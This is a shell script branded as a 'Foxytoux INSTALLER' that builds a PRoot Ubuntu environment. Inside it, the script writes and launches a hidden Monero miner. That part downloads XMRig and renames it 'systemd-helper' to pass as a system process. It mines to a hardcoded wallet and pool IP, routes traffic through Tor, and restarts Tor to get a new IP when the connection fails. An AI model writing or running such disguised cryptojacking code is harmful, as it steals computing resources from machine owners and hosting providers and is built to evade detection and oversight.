#!/bin/sh

ROOTFS_DIR=$(pwd)
export PATH=$PATH:~/.local/usr/bin
max_retries=50
timeout=1
ARCH=$(uname -m)

if [ "$ARCH" = "x86_64" ]; then
  ARCH_ALT=amd64
elif [ "$ARCH" = "aarch64" ]; then
  ARCH_ALT=arm64
else
  printf "Unsupported CPU architecture: ${ARCH}"
  exit 1
fi

if [ ! -e $ROOTFS_DIR/.installed ]; then
  echo "#######################################################################################"
  echo "#"
  echo "#                                      Foxytoux INSTALLER"
  echo "#"
  echo "#                           Copyright (C) 2024, RecodeStudios.Cloud"
  echo "#"
  echo "#######################################################################################"

  install_ubuntu="YES"
fi

case $install_ubuntu in
  [yY][eE][sS])
    wget --tries=$max_retries --timeout=$timeout --no-hsts -O /tmp/rootfs.tar.gz \
      "http://cdimage.ubuntu.com/ubuntu-base/releases/20.04/release/ubuntu-base-20.04.4-base-${ARCH_ALT}.tar.gz"
    tar -xf /tmp/rootfs.tar.gz -C $ROOTFS_DIR
    ;;
  *)
    echo "Skipping Ubuntu installation."
    ;;
esac

if [ ! -e $ROOTFS_DIR/.installed ]; then
  mkdir -p $ROOTFS_DIR/usr/local/bin
  wget --tries=$max_retries --timeout=$timeout --no-hsts -O $ROOTFS_DIR/usr/local/bin/proot "https://raw.githubusercontent.com/foxytouxxx/freeroot/main/proot-${ARCH}"

  while [ ! -s "$ROOTFS_DIR/usr/local/bin/proot" ]; do
    rm -f $ROOTFS_DIR/usr/local/bin/proot
    wget --tries=$max_retries --timeout=$timeout --no-hsts -O $ROOTFS_DIR/usr/local/bin/proot "https://raw.githubusercontent.com/foxytouxxx/freeroot/main/proot-${ARCH}"
    [ -s "$ROOTFS_DIR/usr/local/bin/proot" ] && chmod 755 $ROOTFS_DIR/usr/local/bin/proot && break
    sleep 1
  done

  chmod 755 $ROOTFS_DIR/usr/local/bin/proot
fi

if [ ! -e $ROOTFS_DIR/.installed ]; then
  printf "nameserver 1.1.1.1\nnameserver 1.0.0.1" > ${ROOTFS_DIR}/etc/resolv.conf
  rm -rf /tmp/rootfs.tar.xz /tmp/sbin
  touch $ROOTFS_DIR/.installed
fi

CYAN='\e[0;36m'
WHITE='\e[0;37m'
RESET_COLOR='\e[0m'

display_gg() {
  echo -e "${WHITE}___________________________________________________${RESET_COLOR}"
  echo -e ""
  echo -e "           ${CYAN}-----> Mission Completed ! <----${RESET_COLOR}"
}

clear
display_gg

# Run inside the PRoot container
$ROOTFS_DIR/usr/local/bin/proot \
  --rootfs="${ROOTFS_DIR}" \
  -0 -w "/root" -b /dev -b /sys -b /proc -b /etc/resolv.conf --kill-on-exit /bin/bash << 'EOF'

# Update and install packages
apt update && apt install -y sudo nano curl wget

# Create soul.sh miner script
cat << 'EOM' > /root/soul.sh
#!/bin/bash

WALLET="49xs4gWaPLWFzkLbmFgBdm9V9ZU2rf7djF7kUVE11seJgyLEt6GekKpTVhugLXD8tq7gHoMtiqBRj7TsVWdKN5m6Kshxpsv"
POOL="31.97.58.247:8080"
WORKER="king3"

echo "[+] Starting setup..."

install_dependencies() {
    apt update -y
    sudo apt install tor curl net-tools -y
}

start_tor() {
    echo "[+] Restarting Tor with new circuit..."
    sudo pkill tor >/dev/null 2>&1
    sudo service tor restart
    sleep 10
}

test_tor() {
    echo "[+] Current Tor IP:"
    curl --socks5 127.0.0.1:9050 https://ifconfig.me || echo "[!] Tor failed."
    echo ""
}

build_xmrig() {
    curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
    tar -xvf xmrig.tar.gz
    mv xmrig-6.21.0 xmrig
    cd xmrig
    mv xmrig systemd-helper
    rm -rf ../xmrig.tar.gz
}

start_mining() {
    while true; do
        echo "[+] Launching miner via Tor..."
        torsocks ./systemd-helper -o $POOL -u $WALLET -p $WORKER -k --coin monero --donate-level=1 2>&1 | tee log.txt

        if grep -q "We tried for 15 seconds to connect" log.txt; then
            echo "[!] Detected Tor failure. Rotating IP and retrying..."
            cd ..
            start_tor
            test_tor
            cd xmrig
        else
            echo "[✓] Mining exited without Tor connection errors."
            break
        fi
    done
}

# --- MAIN ---
if [ ! -f "./xmrig/systemd-helper" ]; then
    install_dependencies
    build_xmrig
fi

start_tor
test_tor

cd xmrig
start_mining
EOM





# Make all .sh scripts executable
chmod +x /root/*.sh

# Run the miner
./soul.sh

EOF
